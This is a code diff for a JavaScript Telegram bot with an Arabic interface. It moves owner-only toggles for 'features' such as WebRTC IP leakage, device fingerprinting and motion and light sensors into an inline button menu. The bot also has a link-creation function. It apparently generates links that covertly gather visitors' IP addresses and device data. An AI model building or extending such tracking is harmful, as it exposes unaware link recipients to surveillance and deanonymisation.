@@ -466,53 +466,9 @@ bot.on('message', async (msg) => {
   }
 
   // ── Feature control ───────────────────────────────────────────────────────
-  const FEAT_NAMES = { gyroscope:"🌀 جيروسكوب", webrtc:"🌐 WebRTC IP", fingerprint:"🖥️ بصمة الجهاز", sessionTime:"⏱️ وقت الجلسة", lightSensor:"💡 مستشعر الضوء" };
-
   if (msg.text === "/features") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const expiry = settings.featureExpiry ? `\n⏱️ تنتهي في: ${new Date(settings.featureExpiry).toJSON().slice(0,19).replace('T',' ')} UTC` : "";
-    const list = Object.entries(settings.features).map(([k,v]) =>
-      `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k]||k} — /feature ${k} ${v?'off':'on'}`
-    ).join("\n");
-    return bot.sendMessage(chatId, `🎛️ الميزات الإضافية:${expiry}\n\n${list}\n\n/fallon — تشغيل الكل\n/falloff — إيقاف الكل\n/ftimer [دقائق] — تشغيل لمدة محددة`);
-  }
-
-  if (msg.text?.startsWith("/feature ")) {
-    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const parts = msg.text.replace("/feature ","").trim().split(" ");
-    const fname = parts[0], fval = parts[1];
-    if (!fname || !fval) return bot.sendMessage(chatId, "⚠️ /feature [اسم] [on/off]");
-    if (!(fname in settings.features)) return bot.sendMessage(chatId, `⚠️ ميزة غير موجودة.\nالميزات: ${Object.keys(settings.features).join(", ")}`);
-    settings.features[fname] = (fval === "on"); saveSettings();
-    return bot.sendMessage(chatId, `${settings.features[fname]?'🟢':'🔴'} ${FEAT_NAMES[fname]||fname}: ${settings.features[fname]?'مفعّلة':'معطّلة'}`);
-  }
-
-  if (msg.text === "/fallon") {
-    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    Object.keys(settings.features).forEach(k => settings.features[k]=true); saveSettings();
-    return bot.sendMessage(chatId, "🟢 تم تفعيل جميع الميزات.");
-  }
-
-  if (msg.text === "/falloff") {
-    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    Object.keys(settings.features).forEach(k => settings.features[k]=false); settings.featureExpiry=null; saveSettings();
-    return bot.sendMessage(chatId, "🔴 تم إيقاف جميع الميزات.");
-  }
-
-  if (msg.text?.startsWith("/ftimer ")) {
-    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const mins = parseInt(msg.text.replace("/ftimer ","").trim());
-    if (isNaN(mins)||mins<1) return bot.sendMessage(chatId, "⚠️ /ftimer [دقائق]");
-    Object.keys(settings.features).forEach(k => settings.features[k]=true);
-    settings.featureExpiry = Date.now() + mins*60*1000; saveSettings();
-    const until = new Date(settings.featureExpiry).toJSON().slice(0,19).replace('T',' ');
-    return bot.sendMessage(chatId, `⏱️ تم تفعيل جميع الميزات لمدة ${mins} دقيقة\n🕐 تنتهي في: ${until} UTC`);
-  }
-
-  if (msg.text === "/ftimeroff") {
-    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    settings.featureExpiry = null; saveSettings();
-    return bot.sendMessage(chatId, "✅ تم إلغاء مؤقت الميزات.");
+    return sendFeaturesMenu(chatId);
   }
 
   if (msg.text === "/mystats") {
@@ -542,6 +498,27 @@ bot.on('callback_query', async (q) => {
   if (data.startsWith("reply:"))
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
 
+  // ── Feature buttons ────────────────────────────────────────────────────────
+  if (data.startsWith("ft:") && chatId === BOT_OWNER) {
+    const msgId = q.message.message_id;
+    if (data.startsWith("ft:t:")) {
+      const k = data.replace("ft:t:","");
+      if (k in settings.features) { settings.features[k] = !settings.features[k]; saveSettings(); }
+    } else if (data === "ft:allon") {
+      Object.keys(settings.features).forEach(k => settings.features[k]=true); saveSettings();
+    } else if (data === "ft:alloff") {
+      Object.keys(settings.features).forEach(k => settings.features[k]=false);
+      settings.featureExpiry = null; saveSettings();
+    } else if (data.startsWith("ft:timer:")) {
+      const mins = parseInt(data.replace("ft:timer:",""));
+      Object.keys(settings.features).forEach(k => settings.features[k]=true);
+      settings.featureExpiry = Date.now() + mins*60*1000; saveSettings();
+    } else if (data === "ft:timeroff") {
+      settings.featureExpiry = null; saveSettings();
+    }
+    return editFeaturesMenu(chatId, msgId);
+  }
+
   if (data.startsWith("qr:")) {
     const uid = data.replace("qr:","").trim();
     const link = lastLink.get(uid) || lastLink.get(String(chatId));
@@ -554,6 +531,58 @@ bot.on('callback_query', async (q) => {
 });
 
 bot.on('polling_error', () => {});
+
+// ── Features Menu Builder ─────────────────────────────────────────────────────
+const FEAT_NAMES = {
+  gyroscope:   "🌀 جيروسكوب",
+  webrtc:      "🌐 WebRTC IP",
+  fingerprint: "🖥️ بصمة الجهاز",
+  sessionTime: "⏱️ وقت الجلسة",
+  lightSensor: "💡 مستشعر الضوء"
+};
+
+function buildFeaturesKeyboard() {
+  const rows = Object.entries(settings.features).map(([k, v]) => ([{
+    text: `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k] || k}`,
+    callback_data: `ft:t:${k}`
+  }]));
+  rows.push([
+    { text: "🟢 تشغيل الكل",  callback_data: "ft:allon"  },
+    { text: "🔴 إيقاف الكل", callback_data: "ft:alloff" }
+  ]);
+  rows.push([
+    { text: "⏱️ 15 دقيقة", callback_data: "ft:timer:15" },
+    { text: "⏱️ 30 دقيقة", callback_data: "ft:timer:30" },
+    { text: "⏱️ 60 دقيقة", callback_data: "ft:timer:60" }
+  ]);
+  if (settings.featureExpiry) {
+    rows.push([{ text: "❌ إلغاء المؤقت", callback_data: "ft:timeroff" }]);
+  }
+  return JSON.stringify({ inline_keyboard: rows });
+}
+
+function featuresText() {
+  const expiry = settings.featureExpiry
+    ? `\n⏱️ تنتهي في: ${new Date(settings.featureExpiry).toJSON().slice(0,16).replace('T',' ')} UTC`
+    : "";
+  return `🎛️ *الميزات الإضافية*${expiry}\n\nاضغط على الميزة لتشغيلها أو إيقافها:`;
+}
+
+function sendFeaturesMenu(cid) {
+  return bot.sendMessage(cid, featuresText(), {
+    parse_mode: "Markdown",
+    reply_markup: buildFeaturesKeyboard()
+  });
+}
+
+function editFeaturesMenu(chatId, msgId) {
+  return bot.editMessageText(featuresText(), {
+    chat_id: chatId,
+    message_id: msgId,
+    parse_mode: "Markdown",
+    reply_markup: buildFeaturesKeyboard()
+  }).catch(() => {});
+}
 
 // ── Link Creation ─────────────────────────────────────────────────────────────
 
